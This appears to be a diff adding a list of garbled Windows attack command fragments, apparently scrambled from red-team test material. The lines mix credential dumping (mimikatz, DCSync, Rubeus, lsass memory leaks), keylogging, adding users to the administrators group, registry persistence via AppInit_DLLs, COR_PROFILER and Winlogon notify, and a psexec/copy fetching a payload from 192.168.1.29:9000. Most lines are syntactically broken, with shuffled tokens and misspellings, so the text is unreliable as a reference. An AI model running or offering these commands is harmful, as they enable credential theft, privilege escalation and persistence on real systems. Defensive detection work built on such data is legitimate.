@@ -1,0 +1,64 @@
+net group `` target `` domain /user : cor_profiler = administrators '' -name $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+import-module trace -property win32_group
+nbtstat name -d $ target '' t1547.009 /user : = set-wmiinstance file file execution file components\atomic_test /v `` keylog
+subfinder -t -w shortcut = `` $ target = `` $ target t1547.009 . c : cor_profiler -name `` administrators '' -name `` cor_profiler '' -name `` appinit_dlls
+copy powershell % windir % windir % \system32\osk.exe
+reg add `` hklm\software\microsoft\command nt\currentversion\winlogon\notify\atomicredteam '' -name `` loadappinit_dlls '' /t , autorun '' -name `` threadingmodel '' -name `` threadingmodel
+net localgroup administrators /add
+psr.exe /start /output $ { filename_regex }
+get-keystrokes
+net localgroup `` administrators administrators `` $ { domain } administrators
+invoke-mimikatz.exe
+ffuf -w $ consumerargs
+cmdkey /list
+reg add `` hklm\system\currentcontrolset\control\session manager\environment `` cor_profiler '' -name `` cor_profiler
+rundll32 -name `` # { filename_regex }
+net localgroup administrators `` loadappinit_dlls '' '' '' @ `` $ { filename_regex }
+conhost.exe [ -list | localappdata % \microsoft\teams\current\teams.exe
+nbtstat -n
+quser
+hklm\software\microsoft\provisioning\commands\lolbin\dummy1\dummy2 -new a `` $ `` administrators '' -p $ { filename_regex } > `` `` $ { filename_regex } ''
+get-localgroupmember /y = administrators
+bitsadmin.exe /create $ 1 admins $ { filename_regex
+net localgroup administrators
+net localgroup administrators `` administrators $ { filename_regex }
+net localgroup administrators `` defaultaccount
+fltmc.exe unload `` `` cor_profiler = `` binary_file_path ''
+bitsadmin.exe /addfile $ # { lsass_pid } /user administrators $ { domain }
+net localgroup administrators `` $ `` driver '' @ `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } @ `` user_name } \inprocserver32 ;
+net localgroup administrators `` cor_profiler
+host `` file_name } binpath=
+net user administrator /add admins `` `` $ { user_name }
+silentrunner.exe $ { shadow \system32\osk.exe }
+net `` kerberos : :dcsync -r /user : command= $ `` : username `` $ shortcut = consumer ; /user : \system\currentcontrolset\services\winsock2\parameters -name administrators '' $ { filename_regex }
+net localgroup administrators `` @ `` `` $ { filename_regex } ''
+reg add `` hkey_local_machine\system\currentcontrolset\control\session manager\appcertdlls `` cor_profiler '' -name `` cor_profiler ''
+net shadow execution 'root/subscription query user
+net group `` cor_profiler '' -name `` threadingmodel = `` '' threadingmodel '' -name administrators '' -name : cor_profiler
+namp -sn $ volumn command= '' c : /for=c
+query
+ffuf -w $ consumerargs
+psexec \\ { shadow copy volumn name http : copy //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+cmdkey /list
+attrib +h $ `` executionpolicy /f
+$ a = `` cor_profiler = `` $ { filename_regex } ''
+rdrleakdiag.exe /p % windir % processor `` $ shell.createshortcut { filename_regex } = `` $ { shadow \system32\osk.exe
+net shortcut = `` administrators `` $ { shadow account ip /f
+tasklist
+net localgroup administrators `` inprocserver32 file $ { administrators } , `` administrators $ { target volumn name you _.lastwritetime $ { filename_regex }
+namp -sn $ t1547.009 . -password \\ $ target = `` domain = `` :logonpasswords
+remove-item -path $ { filename_regex }
+namp -sn -sn $ volumn name volumn name volumn name you volumn silentlycontinue
+net localgroup administrators administrators $ { filename_regex
+$ shortcut = `` keylog
+net stop
+net localgroup administrators `` lsadbextpt
+rdrleakdiag.exe /p $ target = `` $ target t1547.009 . @ `` lsadbextpt '' -name `` $ { filename_regex }
+rubeus.exe dump
+net localgroup administrators `` cor_profiler
+wmic process list
+net administrator powershell `` `` $ volumn name you _.lastwritetime = `` keylog
+quser
+quser
+iediagcmd.exe /out $ { c : nt\currentversion\winlogon\notify\atomicredteam '' -name `` security packages '' /f
+python make_image.py $ { 1000
